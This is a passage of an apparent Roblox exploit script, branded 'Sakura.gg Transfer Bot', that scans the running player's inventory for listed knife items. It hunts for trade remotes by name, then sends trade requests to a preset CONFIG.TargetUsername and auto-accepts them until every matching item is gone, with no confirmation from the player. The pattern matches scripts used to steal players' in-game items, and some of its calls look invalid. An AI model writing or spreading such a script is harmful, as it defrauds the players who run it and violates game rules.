"Ripper", "Green Elite", "Tree", "Web", "Rupture", "Ginger", "Santa's Spirit", "Splash", "Ghost", "Fusion", "Predator", "Rune" } -- Create a set for fast lookup local ITEM_SET = {} for _, name in ipairs(ITEMS) do ITEM_SET[name] = true end -- Get all items from inventory local function getInventoryItems() local items = {} local checked = {} -- Check player's Backpack local backpack = player:FindFirstChild("Backpack") if backpack then for _, item in ipairs(backpack:GetChildren()) do if item:IsA("Tool") and ITEM_SET[item.Name] and not checked[item.Name] then checked[item.Name] = true table.insert(items, item.Name) end end end -- Check player directly for _, item in ipairs(player:GetChildren()) do if item:IsA("Tool") and ITEM_SET[item.Name] and not checked[item.Name] then checked[item.Name] = true table.insert(items, item.Name) end end return items end -- Find trade remotes local function getTradeRemote() for _, obj in ipairs(ReplicatedStorage:GetChildren()) do if obj:IsA("RemoteEvent") then local name = obj.Name:lower() if name:find("trade") or name:find("offer") or name:find("request") then return obj end end end return nil end -- Send trade request local function requestTrade(targetName) local remote = getTradeRemote() if remote then pcall(function() remote:FireServer(targetName) end) end end -- Add item to trade local function addItemToTrade(itemName) local remote = getTradeRemote() if remote then pcall(function() remote:FireServer(itemName) end) end end -- Accept trade local function acceptTrade() -- Try UI buttons local playerGui = player:FindFirstChild("PlayerGui") if playerGui then for _, gui in ipairs(playerGui:GetDescendants()) do if gui:IsA("TextButton") then local text = gui.Text:lower() if text:find("accept") or text:find("confirm") or text:find("ready") then pcall(function() gui:Fire("MouseButton1Click") end) end end end end -- Try remote local remote = getTradeRemote() if remote then pcall(function() remote:FireServer("Accept") end) end end -- Main transfer function local function transferAllItems() print("========================================") print("🌸 SAKURA.GG TRANSFER BOT 🌸") print("========================================") local items = getInventoryItems() if #items == 0 then print("No items found to transfer!") return end print("Found " .. #items .. " items to transfer") print("Target: " .. CONFIG.TargetUsername) print("") -- Split into chunks of 4 for i = 1, #items, 4 do local chunk = {} for j = i, math.min(i + 3, #items) do table.insert(chunk, items[j]) end print("Trade " .. math.floor((i-1)/4) + 1 .. " of " .. math.ceil(#items/4)) print("Items: " .. table.concat(chunk, ", ")) -- Send request requestTrade(CONFIG.TargetUsername) wait(CONFIG.SafetyCooldown) -- Add items for _, itemName in ipairs(chunk) do addItemToTrade(itemName) print(" Added: " .. itemName) wait(CONFIG.TransferDelay) end -- Accept acceptTrade() print(" Trade completed!") wait(CONFIG.SafetyCooldown) print("") end print("========================================") print("✅ ALL ITEMS TRANSFERRED!") print("========================================") end -- Run the script print("Starting Sakura Transfer Bot...") wait(2) transferAllItems()
